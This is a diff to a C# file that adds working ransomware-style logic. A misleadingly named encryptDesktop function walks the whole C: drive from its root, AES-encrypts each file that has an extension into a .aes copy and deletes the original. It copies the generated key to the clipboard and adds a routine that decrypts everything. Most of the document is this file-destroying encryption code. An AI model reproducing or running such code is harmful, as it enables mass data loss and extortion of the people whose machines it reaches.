@@ -6,15 +6,18 @@ using System.Windows;
 using System.Security.Cryptography;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Windows.Forms;
 
 
 namespace EncryptionLogic
 {
+
 	public class Encryption
 	{
 		private static Random random = new Random();
-		//private static byte[] passwordBytes = new byte[];
 
+		private static List<string> listOfFilesToEncrypt;
+		//private static byte[] passwordBytes = new byte[];
 		public string generate256BitKey()
 		{
 			const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";
@@ -27,12 +30,11 @@ namespace EncryptionLogic
 			}
 			catch (Exception e)
 			{
-				MessageBox.Show(e.Message);
+				System.Windows.MessageBox.Show(e.Message);
 
 			}
 			return null;
 		}
-
 		public static byte[] GenerateRandomSalt()
 		{
 			byte[] data = new byte[32];
@@ -49,7 +51,7 @@ namespace EncryptionLogic
 			return data;
 		}
 
-		private void encryptFile(string file, Rfc2898DeriveBytes key)
+		private void encryptFile(string file, Rfc2898DeriveBytes key, byte[] salt)
 		{
 			FileStream fsCrypt = new FileStream(file + ".aes", FileMode.Create);
 			RijndaelManaged AES = new RijndaelManaged();
@@ -58,25 +60,58 @@ namespace EncryptionLogic
 			AES.Padding = PaddingMode.PKCS7;
 			AES.Key = key.GetBytes(AES.KeySize / 8);
 			AES.IV = key.GetBytes(AES.BlockSize / 8);
+			fsCrypt.Write(salt, 0, salt.Length);
 
 			CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
-			File.Delete(file);
-		}
 
+			FileStream fsIn = new FileStream(file, FileMode.Open);
+
+			//create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
+			byte[] buffer = new byte[1048576];
+			int read;
+
+			try
+			{
+				while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
+				{
+					cs.Write(buffer, 0, read);
+				}
+
+				// Close up
+				fsIn.Close();
+				File.Delete(file);
+			}
+			catch (Exception ex)
+			{
+				Console.WriteLine("Error: " + ex.Message);
+			}
+			finally
+			{
+				cs.Close();
+				fsCrypt.Close();
+			}
+		}
+		[STAThread]
 		public int encryptDesktop()
 		{
 			try
 			{
 				//string filepath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-				List<string> filesList = getCDriveFiles().ToList();
+				listOfFilesToEncrypt = getCDriveFiles().ToList();
 				//DirectoryInfo d = new DirectoryInfo(filepath);
-
+				byte[] salt = GenerateRandomSalt();
 				string passwordBytes = generate256BitKey();
-				var key = new Rfc2898DeriveBytes(passwordBytes, 0, 50000);
-
-				foreach (var file in filesList)
+				var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
+				Clipboard.SetText(passwordBytes);
+				foreach (var file in listOfFilesToEncrypt)
 				{
-					encryptFile(file, key);
+					if (file.ToString().Contains("."))
+					{
+						try 
+						{
+							encryptFile(file, key, salt);
+						} catch (Exception ex) { }
+					}
 				}
 
 				byte[] encryptedBytes = null;
@@ -84,14 +119,14 @@ namespace EncryptionLogic
 			}
 			catch (Exception e)
 			{
-				MessageBox.Show(e.InnerException.ToString());
+				System.Windows.MessageBox.Show(e.Message);
 				return 0;
 			}
 		}
 
 		public static IEnumerable<string> getCDriveFiles()
 		{
-			string currDirectory = Environment.GetFolderPath(Environment.SpecialFolder.System);
+			string currDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
 			Queue<string> pending = new Queue<string>();
 			pending.Enqueue(currDirectory);
 			string[] tmp;
@@ -119,6 +154,54 @@ namespace EncryptionLogic
 					}
 				}
 			}
+		}
+
+		public static void decryptAllFiles(Rfc2898DeriveBytes key)
+		{
+			int read;
+			foreach (var file in listOfFilesToEncrypt)
+			{
+				FileStream fsCrypt = new FileStream(file, FileMode.Open);
+				string outputfile = file.Replace(".aes", String.Empty);
+				RijndaelManaged AES = new RijndaelManaged();
+				AES.KeySize = 256;
+				AES.BlockSize = 128;
+				AES.Key = key.GetBytes(AES.KeySize / 8);
+				AES.IV = key.GetBytes(AES.BlockSize / 8);
+				AES.Padding = PaddingMode.PKCS7;
+				AES.Mode = CipherMode.CFB;
+
+				CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);
+
+				FileStream fsout = new FileStream(outputfile, FileMode.Create);
+				
+				byte[] buffer = new byte[1048576];
+				try
+				{
+					while ((read = cs.Read(buffer, 0, buffer.Length)) > 0)
+					{
+						fsout.Write(buffer, 0, read);
+					}
+				}
+				catch ( CryptographicException ex_cryp)
+				{
+					
+				}
+				try
+				{
+					cs.Close();
+				}
+				catch (Exception exx)
+				{
+
+				}
+				finally
+				{
+					fsout.Close();
+					fsCrypt.Close();
+				}
+			}
+				
 		}
 	}
 }
